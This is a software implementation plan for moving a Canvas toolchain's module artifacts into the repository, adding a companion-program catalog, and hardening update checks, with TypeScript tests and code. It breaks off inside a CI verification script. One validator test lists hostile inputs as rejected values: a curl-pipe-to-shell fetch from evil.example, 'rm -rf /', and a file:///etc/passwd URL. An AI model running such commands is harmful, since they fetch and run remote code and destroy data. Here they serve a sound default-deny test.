# One Release, One Module Directory — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make Canvas Toolchain the only thing on the Releases page — module artifacts become reviewable, reproducible files on `main` — and repair the update-notification path that a module release silently killed.

**Architecture:** Module `.mjs` artifacts move from GitHub Release assets to `modules/<id>/<version>/<id>-<version>.mjs`, served over `raw.githubusercontent.com` and still sha256-pinned by `module-catalog.json`. The catalog bumps to version 2 and gains a `companions[]` array (prose + link, default-deny fields, never anything runnable). The update check stops trusting GitHub's "latest release" and accepts only strict `vX.Y.Z` tags. A CI gate rebuilds each committed artifact from source and fails on any byte difference.

**Tech Stack:** TypeScript (Node 20+, ESM, Vitest), esbuild (`scripts/build-module.mjs`), GitHub Actions.

**Spec:** [`docs/superpowers/specs/2026-07-12-one-release-module-directory-design.md`](../specs/2026-07-12-one-release-module-directory-design.md)

## Global Constraints

- **The catalog never carries an executable payload.** No `installCommand`, `script`, `cmd`, `exec`, or any shell string, in any entry of any kind. Companion validation is **default-deny**: any field outside the permitted set is a validation failure, not an ignored extra.
- **Fail-closed on install, fail-soft on startup.** Bad hash / off-allowlist URL / malformed entry → structured refusal. Network failure at startup → silent; never throws, never blocks server start.
- **Nothing auto-installs.** `install_module`'s two-call confirm gate is untouched.
- **Public repo.** No PII and no institution-specific values in code, tests, fixtures, docs, or catalog content.
- **State writes are atomic** (tmp + `renameSync`) with `mode: 0o600`; mode asserts in tests are guarded by `platform() !== 'win32'`.
- **Refusals are structured** `{ error, message, fix }`.
- **The sha256 is the guarantee.** URL allowlists are defence in depth, never the trust anchor.
- Commits end with `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`. Never `--no-verify`.

---

## File Structure

| File | Responsibility | Change |
| --- | --- | --- |
| `packages/command-and-control/src/channel/catalog.ts` | Catalog schema, validation, fetch/cache; URL allowlists | Modify |
| `packages/command-and-control/src/channel/install.ts` | Fail-closed install choke point | Modify (comment only — it reads the constant) |
| `packages/command-and-control/src/channel/notice_state.ts` | Persisted throttle state for the discovery notice | **Create** |
| `packages/command-and-control/src/channel/notices.ts` | Composes startup channel notices | Modify |
| `packages/command-and-control/src/update/check.ts` | App-update check + `compareVersions` | Modify |
| `packages/command-and-control/src/tools/module_channel_tools.ts` | `browse_module_catalog` | Modify |
| `scripts/verify-module-artifacts.mjs` | CI gate: committed artifact == fresh build == catalog hash | **Create** |
| `scripts/generate-module-docs.mjs` | Generates `docs/modules.md` from the catalog | **Create** |
| `.gitattributes` | Keeps committed `.mjs` bytes exact on every platform | **Create** |
| `.github/workflows/ci.yml` | Adds the artifact + docs-drift gates | Modify |
| `.github/workflows/release-module.yml` | Per-module releases | **Delete** |
| `module-catalog.json` | The trust root | Modify (**separate PR — see Runbook**) |
| `modules/announcements/1.1.0/announcements-1.1.0.mjs` | The artifact | **Create** (**separate PR — see Runbook**) |

Tasks 1–7 are one PR and change **no** catalog content. The catalog cutover is a second PR that ships *after* the v2.1.0 release — see the Runbook. Doing it in one PR would break every v2.0.x install before those users have any way to learn an update exists.

---

### Task 1: Update-check hardening (the live defect)

This is first because it is a shipped bug: `/releases/latest` currently returns `module-announcements-v1.1.0`, `compareVersions` parses it as `0.1.0`, and every professor on v1.x is silently told there is no update — including for the v2.0.1 security release.

**Files:**
- Modify: `packages/command-and-control/src/update/check.ts`
- Test: `packages/command-and-control/tests/update-check.test.ts`

**Interfaces:**
- Produces: `parseToolchainTag(tag: string): string | null` — `'v2.1.0'` → `'2.1.0'`; anything else → `null`.

- [ ] **Step 1: Write the failing tests**

Append to `packages/command-and-control/tests/update-check.test.ts`:

```ts
import { parseToolchainTag } from '../src/update/check.js';

describe('parseToolchainTag', () => {
  it('accepts only strict toolchain tags', () => {
    expect(parseToolchainTag('v2.1.0')).toBe('2.1.0');
    expect(parseToolchainTag('v10.0.3')).toBe('10.0.3');
  });

  it('rejects module tags, prerelease tags, and partial versions', () => {
    // The live defect: this tag held GitHub's "Latest" badge and the old parser
    // read it as 0.1.0, so the update notice went silent.
    expect(parseToolchainTag('module-announcements-v1.1.0')).toBeNull();
    expect(parseToolchainTag('nightly')).toBeNull();
    expect(parseToolchainTag('v2.1')).toBeNull();
    expect(parseToolchainTag('v2.1.0-rc1')).toBeNull();
    expect(parseToolchainTag('2.1.0')).toBeNull();
  });
});

describe('checkForUpdates release selection', () => {
  const releases = [
    { tag_name: 'module-announcements-v1.1.0', draft: false, prerelease: false },
    { tag_name: 'v2.2.0-rc1', draft: false, prerelease: true },
    { tag_name: 'v2.3.0', draft: true, prerelease: false },
    { tag_name: 'v2.1.0', draft: false, prerelease: false },
    { tag_name: 'v2.0.1', draft: false, prerelease: false },
  ];

  it('picks the newest strict toolchain release, ignoring module/draft/prerelease tags', async () => {
    const fetchImpl = (async () =>
      new Response(JSON.stringify(releases), { status: 200 })) as unknown as typeof fetch;
    resetUpdateState();
    await checkForUpdates({ fetchImpl, installedVersion: '2.0.1', cachePath: join(dir, 'u.json') });
    expect(getUpdateNotice()).toContain('v2.1.0');
  });

  it('reports no update when only non-toolchain tags exist', async () => {
    const onlyModules = [{ tag_name: 'module-announcements-v1.1.0', draft: false, prerelease: false }];
    const fetchImpl = (async () =>
      new Response(JSON.stringify(onlyModules), { status: 200 })) as unknown as typeof fetch;
    resetUpdateState();
    await checkForUpdates({ fetchImpl, installedVersion: '2.0.1', cachePath: join(dir, 'u2.json') });
    expect(getUpdateNotice()).toBeNull();
  });
});
```

The existing test file has no `dir` fixture or injectable options; add at its top (matching the `channel-catalog.test.ts` idiom):

```ts
import { mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

let dir: string;
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'cc-update-')); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });
```

- [ ] **Step 2: Run the tests and watch them fail**

Run: `npm test --workspace=packages/command-and-control -- update-check`
Expected: FAIL — `parseToolchainTag` is not exported, and `checkForUpdates` takes no arguments.

- [ ] **Step 3: Implement**

In `packages/command-and-control/src/update/check.ts`, replace the `GITHUB_RELEASES_URL` constant, `fetchLatestRelease`, and `checkForUpdates` with:

```ts
const GITHUB_RELEASES_URL =
  'https://api.github.com/repos/Ryfter/canvas-toolchain/releases?per_page=30';

const TOOLCHAIN_TAG = /^v(\d+)\.(\d+)\.(\d+)$/;

/**
 * A toolchain release tag, or null.
 *
 * The Releases page is shared with anything else that gets tagged. Trusting
 * GitHub's `/releases/latest` once returned `module-announcements-v1.1.0`, which
 * the lenient parser read as 0.1.0 — so the toolchain concluded it was already
 * up to date and stopped telling anyone about updates, security ones included.
 * Anything that is not exactly `vMAJOR.MINOR.PATCH` is invisible here, by design.
 */
export function parseToolchainTag(tag: string): string | null {
  const m = TOOLCHAIN_TAG.exec(tag);
  return m ? `${m[1]}.${m[2]}.${m[3]}` : null;
}

interface GitHubRelease { tag_name?: unknown; draft?: unknown; prerelease?: unknown }

async function fetchLatestToolchainRelease(fetchImpl: typeof fetch): Promise<string | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), NETWORK_TIMEOUT_MS);
  try {
    const response = await fetchImpl(GITHUB_RELEASES_URL, {
      headers: { accept: 'application/vnd.github+json' },
      signal: controller.signal,
    });
    if (!response.ok) return null;
    const body = await response.json();
    if (!Array.isArray(body)) return null;
    let best: string | null = null;
    for (const raw of body as GitHubRelease[]) {
      if (raw.draft === true || raw.prerelease === true) continue;
      if (typeof raw.tag_name !== 'string') continue;
      const version = parseToolchainTag(raw.tag_name);
      if (!version) continue;
      if (best === null || compareVersions(best, version) < 0) best = version;
    }
    return best;
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

export interface UpdateCheckOptions {
  fetchImpl?: typeof fetch;
  installedVersion?: string;
  cachePath?: string;
}

export async function checkForUpdates(opts: UpdateCheckOptions = {}): Promise<void> {
  const fetchImpl = opts.fetchImpl ?? fetch;
  const installed = opts.installedVersion ?? getInstalledVersion();
  const cachePath = opts.cachePath ?? getCachePath();
  const cache = readCache(cachePath);

  let latest: string | null = null;
  if (cache && isFresh(cache)) {
    latest = cache.latestVersion;
  } else {
    latest = await fetchLatestToolchainRelease(fetchImpl);
    if (latest !== null) {
      try {
        writeFileSync(
          cachePath,
          JSON.stringify({ lastCheckAt: new Date().toISOString(), latestVersion: latest }, null, 2),
          { encoding: 'utf-8', mode: 0o600 },
        );
      } catch {
        // Cache write is best-effort; ignore failures (e.g. read-only filesystem).
      }
    }
  }

  cachedNotice = latest && compareVersions(installed, latest) < 0 ? formatNotice(latest) : null;
}
```

`readCache` and `isFresh` currently take no argument; change `readCache()` to `readCache(cachePath: string)` and drop its internal `getCachePath()` call.

- [ ] **Step 4: Run the tests and watch them pass**

Run: `npm test --workspace=packages/command-and-control -- update-check`
Expected: PASS, including the pre-existing cases.

- [ ] **Step 5: Commit**

```bash
git add packages/command-and-control/src/update/check.ts packages/command-and-control/tests/update-check.test.ts
git commit -m "fix(cc): update check accepts only strict vX.Y.Z release tags

A module release held GitHub's Latest badge, so the check parsed
module-announcements-v1.1.0 as 0.1.0 and silently reported no update —
including for the v2.0.1 security release. Non-toolchain tags are now
invisible to the check rather than poisoning it.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 2: Catalog v2 — raw-host artifacts and `companions[]`

**Files:**
- Modify: `packages/command-and-control/src/channel/catalog.ts`
- Modify: `packages/command-and-control/src/channel/install.ts` (comment only)
- Test: `packages/command-and-control/tests/channel-catalog.test.ts`
- Test: `packages/command-and-control/tests/channel-install.test.ts` (fixture URLs)

**Interfaces:**
- Consumes: `MAX_ARTIFACT_BYTES`, `isAllowedRedirectHost` (unchanged).
- Produces:
  - `SUPPORTED_CATALOG_VERSION = 2`
  - `ALLOWED_ARTIFACT_URL_PREFIX = 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/'`
  - `interface CompanionEntry { id: string; name: string; summary: string; whyYouWantIt: string; url: string; worksWithoutToolchain?: boolean }`
  - `ModuleCatalog` gains `companions: CompanionEntry[]` (always an array; `[]` when the key is absent).

- [ ] **Step 1: Write the failing tests**

In `packages/command-and-control/tests/channel-catalog.test.ts`, update `GOOD_ENTRY.artifactUrl` and `GOOD_CATALOG`, and add the new suites:

```ts
const GOOD_ENTRY = {
  id: 'announcements', name: 'Announcements Auditor', description: 'Audit scheduled announcements.',
  version: '1.1.0', minHostVersion: '2.1.0',
  artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/announcements/1.1.0/announcements-1.1.0.mjs',
  sha256: 'a'.repeat(64), sizeBytes: 1234,
};
const GOOD_COMPANION = {
  id: 'canvas-backup', name: 'Canvas Backup',
  summary: 'Downloads a complete local archive of a Canvas course.',
  whyYouWantIt: 'The toolchain reads a Canvas Backup archive as the start of the pipeline. It also works on its own.',
  url: 'https://github.com/Ryfter/Canvas-Download',
  worksWithoutToolchain: true,
};
const GOOD_CATALOG = { catalogVersion: SUPPORTED_CATALOG_VERSION, modules: [GOOD_ENTRY], companions: [GOOD_COMPANION] };

describe('validateCatalog — artifact host (v2)', () => {
  it('refuses an artifactUrl outside the repo modules directory on raw.githubusercontent.com', () => {
    for (const artifactUrl of [
      'https://evil.example/m.mjs',
      'http://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
      'https://raw.githubusercontent.com/SomeoneElse/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
      'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/scripts/evil.mjs',
      // The v2.0 hosting scheme is no longer accepted:
      'https://github.com/Ryfter/canvas-toolchain/releases/download/module-announcements-v1.1.0/module-announcements-1.1.0.mjs',
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, modules: [{ ...GOOD_ENTRY, artifactUrl }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });
});

describe('validateCatalog — companions', () => {
  it('accepts a well-formed companion and defaults the array to empty when absent', () => {
    expect(validateCatalog(GOOD_CATALOG).companions[0].id).toBe('canvas-backup');
    expect(validateCatalog({ catalogVersion: 2, modules: [GOOD_ENTRY] }).companions).toEqual([]);
  });

  it('refuses any field outside the permitted set — the catalog carries no executable payload', () => {
    for (const extra of [
      { installCommand: 'curl https://evil.example/x.sh | sh' },
      { script: 'rm -rf /' },
      { cmd: 'powershell -c whoami' },
      { exec: 'node evil.js' },
      { artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/x/1.0.0/x-1.0.0.mjs' },
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, ...extra }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });

  it('refuses a companion url that is not https on github.com', () => {
    for (const url of [
      'http://github.com/Ryfter/Canvas-Download',
      'https://evil.example/Canvas-Download',
      'https://github.com.evil.example/x',
      'file:///etc/passwd',
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, url }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });

  it('refuses a companion missing a required field', () => {
    const missing = { ...GOOD_COMPANION } as Record<string, unknown>;
    delete missing.whyYouWantIt;
    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [missing] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
  });

  it('refuses an id shared between a module and a companion', () => {
    const clash = { ...GOOD_COMPANION, id: 'announcements' };
    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [clash] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID', message: expect.stringContaining('announcements') }));
  });
});

describe('validateCatalog — version', () => {
  it('accepts catalogVersion 2 and refuses 3', () => {
    expect(validateCatalog({ ...GOOD_CATALOG, catalogVersion: 2 }).catalogVersion).toBe(2);
    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 3 }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_VERSION_UNSUPPORTED' }));
  });
});
```

Delete the now-obsolete `refuses an artifactUrl outside this repo's GitHub Releases (#121)` test — it is replaced by the v2 host test above. Keep every other existing test, updating only `catalogVersion: 1` literals to `2` where they appear inline.

In `packages/command-and-control/tests/channel-install.test.ts`, replace every `https://github.com/Ryfter/canvas-toolchain/releases/download/...` fixture URL with the raw-host form:
`https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/<id>/<version>/<id>-<version>.mjs`.
The `ARTIFACT_URL_NOT_ALLOWED` test that injects a disallowed URL should now inject the **old Releases URL**, proving the previous scheme is refused.

- [ ] **Step 2: Run the tests and watch them fail**

Run: `npm test --workspace=packages/command-and-control -- channel-catalog channel-install`
Expected: FAIL — `companions` is not on `ModuleCatalog`; catalogVersion 2 refused; raw-host URLs refused.

- [ ] **Step 3: Implement**

In `packages/command-and-control/src/channel/catalog.ts`:

```ts
export const SUPPORTED_CATALOG_VERSION = 2;

/** Artifacts are files in this repo, not release assets. A GitHub Release is an
 *  announcement, not a file host: using one put a module on the product's front
 *  page, took the "Latest" badge, and silently killed the update check that
 *  depended on it. Files on main are reviewable in a PR, diffable, and CI can
 *  prove they are what the source builds. The version is a path segment, so a
 *  published artifact's URL is content-immutable by construction. */
export const ALLOWED_ARTIFACT_URL_PREFIX =
  'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/';

/** A separate program that works alongside the toolchain (Canvas Backup and friends).
 *  Prose and a link — never anything runnable. See COMPANION_FIELDS. */
export interface CompanionEntry {
  id: string;
  name: string;
  summary: string;
  whyYouWantIt: string;
  url: string;
  worksWithoutToolchain?: boolean;
}

export interface ModuleCatalog {
  catalogVersion: number;
  modules: CatalogEntry[];
  companions: CompanionEntry[];
}

/** Default-deny. The catalog is the trust root: if an entry could carry a command
 *  line and anything ran it, every hash pin in this file would be decoration. A
 *  companion entry may contain these keys and nothing else. */
const COMPANION_FIELDS = new Set([
  'id', 'name', 'summary', 'whyYouWantIt', 'url', 'worksWithoutToolchain',
]);
const ALLOWED_COMPANION_URL_PREFIX = 'https://github.com/';

function isCompanion(v: unknown): v is CompanionEntry {
  if (typeof v !== 'object' || v === null) return false;
  const e = v as Record<string, unknown>;
  for (const key of Object.keys(e)) {
    if (!COMPANION_FIELDS.has(key)) return false;
  }
  return (
    typeof e.id === 'string' && MODULE_ID.test(e.id) &&
    typeof e.name === 'string' && e.name.length > 0 &&
    typeof e.summary === 'string' && e.summary.length > 0 &&
    typeof e.whyYouWantIt === 'string' && e.whyYouWantIt.length > 0 &&
    typeof e.url === 'string' && e.url.startsWith(ALLOWED_COMPANION_URL_PREFIX) &&
    (e.worksWithoutToolchain === undefined || typeof e.worksWithoutToolchain === 'boolean')
  );
}
```

In `validateCatalog`, after the existing `modules` loop (which already fills `seenIds`), add:

```ts
  const companionsRaw = c.companions ?? [];
  if (!Array.isArray(companionsRaw)) {
    throw new CatalogError('CATALOG_INVALID', 'Catalog companions must be an array.');
  }
  for (const entry of companionsRaw) {
    if (!isCompanion(entry)) {
      throw new CatalogError('CATALOG_INVALID', `Malformed companion entry: ${JSON.stringify(entry).slice(0, 200)}`);
    }
    if (seenIds.has(entry.id)) {
      throw new CatalogError('CATALOG_INVALID', `Duplicate id in catalog: '${entry.id}'.`);
    }
    seenIds.add(entry.id);
  }
  return {
    catalogVersion: c.catalogVersion,
    modules: c.modules as CatalogEntry[],
    companions: companionsRaw as CompanionEntry[],
  };
```

In `packages/command-and-control/src/channel/install.ts`, update the `#121 belt-and-suspenders` comment above the `ARTIFACT_URL_NOT_ALLOWED` check to say *"artifacts may only come from this repo's `modules/` directory on `main`"*. No logic changes — the check reads `ALLOWED_ARTIFACT_URL_PREFIX`, and `isAllowedRedirectHost` already covers `raw.githubusercontent.com` (a `githubusercontent.com` subdomain).

- [ ] **Step 4: Run the tests and watch them pass**

Run: `npm test --workspace=packages/command-and-control`
Expected: PASS. The whole C&C suite must be green — `ModuleCatalog` gained a required field, so any fixture constructing one by hand needs `companions: []`.

- [ ] **Step 5: Commit**

```bash
git add packages/command-and-control/src/channel/ packages/command-and-control/tests/
git commit -m "feat(cc): catalog v2 — repo-hosted artifacts and companion entries

Artifacts move from GitHub Release assets to modules/ on main. Companions
(Canvas Backup and friends) are prose and a link, validated default-deny so
no entry can ever carry something runnable.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 3: `browse_module_catalog` reports companions

**Files:**
- Modify: `packages/command-and-control/src/tools/module_channel_tools.ts`
- Modify: `packages/command-and-control/src/index.ts` (tool description only)
- Test: `packages/command-and-control/tests/module-channel-tools.test.ts`

**Interfaces:**
- Consumes: `ModuleCatalog.companions: CompanionEntry[]` (Task 2).
- Produces: `browseModuleCatalog` result gains `companions: Array<{ id, name, summary, whyYouWantIt, url, worksWithoutToolchain }>`.

- [ ] **Step 1: Write the failing test**

```ts
it('reports companions as install-separately entries and never offers to install them', async () => {
  const catalog = {
    catalogVersion: 2,
    modules: [],
    companions: [{
      id: 'canvas-backup', name: 'Canvas Backup',
      summary: 'Downloads a complete local archive of a Canvas course.',
      whyYouWantIt: 'The toolchain reads its archive as the start of the pipeline.',
      url: 'https://github.com/Ryfter/Canvas-Download',
      worksWithoutToolchain: true,
    }],
  };
  const res = await browseModuleCatalog({}, { catalog });
  const companions = res.companions as Array<Record<string, unknown>>;
  expect(companions).toHaveLength(1);
  expect(companions[0].url).toBe('https://github.com/Ryfter/Canvas-Download');
  expect(JSON.stringify(res)).not.toContain('install_module({ moduleId: "canvas-backup"');
});
```

- [ ] **Step 2: Run it and watch it fail**

Run: `npm test --workspace=packages/command-and-control -- module-channel-tools`
Expected: FAIL — `res.companions` is `undefined`.

- [ ] **Step 3: Implement**

In `browseModuleCatalog`, before the `return`:

```ts
  const companions = catalog.companions.map((c) => ({
    id: c.id,
    name: c.name,
    summary: c.summary,
    whyYouWantIt: c.whyYouWantIt,
    url: c.url,
    worksWithoutToolchain: c.worksWithoutToolchain ?? false,
  }));
```

and extend the returned object:

```ts
  return {
    modules,
    companions,
    note: 'Install a module with install_module({ moduleId }) — it previews first and only acts on confirm: true. Companions are separate programs: read the description and install them yourself from their own page.',
  };
```

In `packages/command-and-control/src/index.ts`, update the `browse_module_catalog` tool description (around line 232) to end with: *"Also lists companion programs (e.g. Canvas Backup) that work alongside the toolchain and are installed separately."*

- [ ] **Step 4: Run the tests and watch them pass**

Run: `npm test --workspace=packages/command-and-control -- module-channel-tools`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add packages/command-and-control/src/tools/module_channel_tools.ts packages/command-and-control/src/index.ts packages/command-and-control/tests/module-channel-tools.test.ts
git commit -m "feat(cc): browse_module_catalog lists companion programs

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 4: Discovery notice, throttled

The other three notices are self-limiting: an app update, a module update, and a pending request all stop being true once acted on. "There are modules you don't have" is true forever for a professor who simply doesn't want them — so unthrottled it becomes noise, and a channel people have learned to ignore is worse than no channel, because the one notice that matters gets ignored too.

**Files:**
- Create: `packages/command-and-control/src/channel/notice_state.ts`
- Modify: `packages/command-and-control/src/channel/notices.ts`
- Test: `packages/command-and-control/tests/channel-notices.test.ts`

**Interfaces:**
- Consumes: `getCcHomePath()` from `../kb/config.js`; `knownModuleIds()` from `../modules/registry.js`; `loadInstalledModules()` from `./installed.js`.
- Produces:
  - `interface NoticeState { lastDiscoveryIds: string[] }`
  - `loadNoticeState(path?: string): NoticeState` — `{ lastDiscoveryIds: [] }` on missing/corrupt.
  - `saveNoticeState(state: NoticeState, path?: string): void` — atomic, `0o600`.
  - `noticeStatePath(): string` — `<CC_HOME>/channel-notice-state.json`.

- [ ] **Step 1: Write the failing tests**

Create/extend `packages/command-and-control/tests/channel-notices.test.ts`:

```ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, statSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir, platform } from 'node:os';
import { loadNoticeState, saveNoticeState } from '../src/channel/notice_state.js';

let dir: string;
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'cc-notice-')); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

describe('notice state', () => {
  it('round-trips, defaults to empty, and writes owner-only without leaving a tmp file', () => {
    const p = join(dir, 'state.json');
    expect(loadNoticeState(p)).toEqual({ lastDiscoveryIds: [] });
    saveNoticeState({ lastDiscoveryIds: ['a', 'b'] }, p);
    expect(loadNoticeState(p)).toEqual({ lastDiscoveryIds: ['a', 'b'] });
    if (platform() !== 'win32') expect(statSync(p).mode & 0o777).toBe(0o600);
    expect(existsSync(`${p}.tmp`)).toBe(false);
  });
});
```

And, in the same file, the throttle behaviour (these use the real `checkChannelNotices`, so they need `CC_HOME` pointed at the temp dir — set `process.env.CC_HOME = dir` in `beforeEach` and restore it in `afterEach`, matching the idiom already used in `channel-install.test.ts`):

```ts
const CATALOG = {
  catalogVersion: 2,
  modules: [{
    id: 'announcements', name: 'Announcements Auditor', description: 'Audit scheduled announcements.',
    version: '1.1.0', minHostVersion: '2.1.0',
    artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/announcements/1.1.0/announcements-1.1.0.mjs',
    sha256: 'a'.repeat(64), sizeBytes: 1234,
  }],
  companions: [],
};

describe('discovery notice', () => {
  it('fires once for a newly available module, then stays quiet on the next startup', async () => {
    resetChannelNotices();
    await checkChannelNotices({ catalog: CATALOG });
    expect(getChannelNotices()).toContain('browse modules');

    resetChannelNotices();
    await checkChannelNotices({ catalog: CATALOG });
    expect(getChannelNotices()).toBeNull();
  });

  it('fires again when a genuinely new module appears', async () => {
    resetChannelNotices();
    await checkChannelNotices({ catalog: CATALOG });

    const withSecond = {
      ...CATALOG,
      modules: [...CATALOG.modules, { ...CATALOG.modules[0], id: 'rubrics', name: 'Rubric Helper' }],
    };
    resetChannelNotices();
    await checkChannelNotices({ catalog: withSecond });
    expect(getChannelNotices()).toContain('browse modules');
  });
});
```

- [ ] **Step 2: Run the tests and watch them fail**

Run: `npm test --workspace=packages/command-and-control -- channel-notices`
Expected: FAIL — `../src/channel/notice_state.js` does not exist.

- [ ] **Step 3: Implement `notice_state.ts`**

```ts
import { existsSync, readFileSync, renameSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { getCcHomePath } from '../kb/config.js';

/** What the discovery notice last told the professor about. Persisted so a
 *  professor who doesn't want the other modules isn't asked every session — a
 *  notice channel people learn to ignore is worse than no channel at all. */
export interface NoticeState {
  lastDiscoveryIds: string[];
}

export function noticeStatePath(): string {
  return join(getCcHomePath(), 'channel-notice-state.json');
}

export function loadNoticeState(path: string = noticeStatePath()): NoticeState {
  if (!existsSync(path)) return { lastDiscoveryIds: [] };
  try {
    const raw = JSON.parse(readFileSync(path, 'utf-8')) as Partial<NoticeState>;
    const ids = Array.isArray(raw.lastDiscoveryIds)
      ? raw.lastDiscoveryIds.filter((id): id is string => typeof id === 'string')
      : [];
    return { lastDiscoveryIds: ids };
  } catch {
    return { lastDiscoveryIds: [] };
  }
}

export function saveNoticeState(state: NoticeState, path: string = noticeStatePath()): void {
  const tmp = `${path}.tmp`;
  writeFileSync(tmp, JSON.stringify(state, null, 2), { encoding: 'utf-8', mode: 0o600 });
  renameSync(tmp, path);
}
```

- [ ] **Step 4: Implement the notice in `notices.ts`**

Add the imports:

```ts
import { knownModuleIds } from '../modules/registry.js';
import { loadNoticeState, saveNoticeState } from './notice_state.js';
```

and, inside `checkChannelNotices`, after the existing module-update loop and still inside `if (catalog) { … }`:

```ts
    const bundled = new Set(knownModuleIds());
    const available = catalog.modules
      .filter((m) => !installed.modules[m.id] && !bundled.has(m.id))
      .map((m) => m.id)
      .sort();

    const state = loadNoticeState();
    const previouslyShown = [...state.lastDiscoveryIds].sort();
    const changed =
      available.length !== previouslyShown.length ||
      available.some((id, i) => id !== previouslyShown[i]);

    if (available.length > 0 && changed) {
      parts.push(`_There are ${available.length} module(s) you don't have yet — say "browse modules" to see them._`);
    }
    if (changed) {
      try {
        saveNoticeState({ lastDiscoveryIds: available });
      } catch {
        // Best-effort: a state-write failure means the notice repeats, never that startup fails.
      }
    }
```

- [ ] **Step 5: Run the tests and watch them pass**

Run: `npm test --workspace=packages/command-and-control -- channel-notices`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add packages/command-and-control/src/channel/notice_state.ts packages/command-and-control/src/channel/notices.ts packages/command-and-control/tests/channel-notices.test.ts
git commit -m "feat(cc): throttled 'modules you don't have' startup notice

Fires only when the set of available-but-not-installed modules changes, so a
professor who declines isn't asked again until something new appears.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 5: Artifact reproducibility gate

The check that was impossible under the Releases model: prove, in the pull request, that the committed bytes are what the source builds.

**Files:**
- Create: `scripts/verify-module-artifacts.mjs`
- Create: `.gitattributes`
- Modify: `package.json` (root — add `verify:modules` script)
- Modify: `.github/workflows/ci.yml`
- Delete: `.github/workflows/release-module.yml`

**Interfaces:**
- Consumes: `scripts/build-module.mjs` via `npm run build:module -- <id>`, which writes `dist-channel/module-<id>-<version>.mjs` and prints `{"sha256": "...", "sizeBytes": N}` on stdout.
- Produces: `npm run verify:modules` — exit 0 if every catalog module's committed artifact matches both its catalog hash and a fresh build; exit 1 with a specific message otherwise.

- [ ] **Step 1: Create `.gitattributes` first — it is load-bearing**

Without this, git rewrites LF→CRLF in the committed `.mjs` on a Windows checkout, the bytes change, and the sha256 pin fails on the developer's own machine. It must exist **before** any artifact is committed.

```gitattributes
# Module channel artifacts are hash-pinned in module-catalog.json. Git must never
# rewrite their line endings — a single LF→CRLF conversion changes every hash and
# breaks the pin on checkout.
modules/**/*.mjs -text
```

- [ ] **Step 2: Write `scripts/verify-module-artifacts.mjs`**

```js
#!/usr/bin/env node
// Verifies that every module artifact committed under modules/ is exactly what the
// catalog pins AND exactly what the source builds. A GitHub Release asset could
// never be checked this way: it existed only after it was already public.
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');
const fail = (msg) => { console.error(`FAIL: ${msg}`); process.exitCode = 1; };

const catalog = JSON.parse(readFileSync('module-catalog.json', 'utf-8'));

for (const entry of catalog.modules) {
  const { id, version, sha256: expected, sizeBytes, artifactUrl } = entry;
  const rel = join('modules', id, version, `${id}-${version}.mjs`);

  const expectedUrl =
    `https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/${id}/${version}/${id}-${version}.mjs`;
  if (artifactUrl !== expectedUrl) {
    fail(`${id} v${version}: artifactUrl does not match its file location.\n  catalog: ${artifactUrl}\n  expected: ${expectedUrl}`);
    continue;
  }

  if (!existsSync(rel)) {
    fail(`${id} v${version}: catalog references ${rel}, which is not committed.`);
    continue;
  }

  const committed = readFileSync(rel);
  const committedHash = sha256(committed);
  if (committedHash !== expected) {
    fail(`${id} v${version}: committed artifact hash does not match the catalog.\n  catalog:   ${expected}\n  committed: ${committedHash}`);
    continue;
  }
  if (committed.byteLength !== sizeBytes) {
    fail(`${id} v${version}: catalog sizeBytes is ${sizeBytes}, committed file is ${committed.byteLength}.`);
    continue;
  }

  execFileSync('npm', ['run', 'build:module', '--silent', '--', id], { stdio: 'pipe', shell: process.platform === 'win32' });
  const built = readFileSync(join('dist-channel', `module-${id}-${version}.mjs`));
